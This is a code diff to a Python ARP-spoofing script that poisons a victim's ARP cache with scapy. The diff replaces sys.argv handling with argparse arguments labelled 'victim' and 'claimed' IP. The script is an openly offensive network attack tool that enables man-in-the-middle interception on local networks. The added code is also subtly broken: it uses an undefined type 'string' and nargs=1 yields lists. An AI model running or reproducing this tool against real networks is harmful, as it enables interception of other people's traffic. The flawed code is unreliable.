@@ -6,6 +6,7 @@ on a victim by claiming an IP address (via cmd line)
 import sys
 import os
 import os.path
+import argparse
 
 from scapy.all import arpcachepoison 
 
@@ -35,14 +36,26 @@ def spoof(victim, claimed, interval = 5, mode = 'request'):
     gratuitous(victim, claimed, interval)
 
 def main():
+  parser = argparse.ArgumentParser(description='Send spoofed ARP packets.')
+  parser.add_argument('victim', metavar='V', type=string, nargs=1,
+                    help='the victim of this attack')
+  parser.add_argument('claimed', metavar='C', type=string, nargs=1,
+                    help='the IP to associate with the attacker MAC')
+  args = parser.parse_args()
+  '''
   if len(sys.argv) != 3:
     print("Usage: %s victim claimed (gateway)" % sys.argv[0])
     sys.exit(2)
+  '''
   print("CTRL C to stop spoofing")
   # victim is the IP of the receiver of spoofed packets
   # claimed is the IP which is claimed by spoofed packets
+  victim = args.victim
+  claimed = args.claimed
+  '''
   victim = sys.argv[1]
   claimed = sys.argv[2]
+  '''
   spoof(victim, claimed)
 
 if __name__ == '__main__':
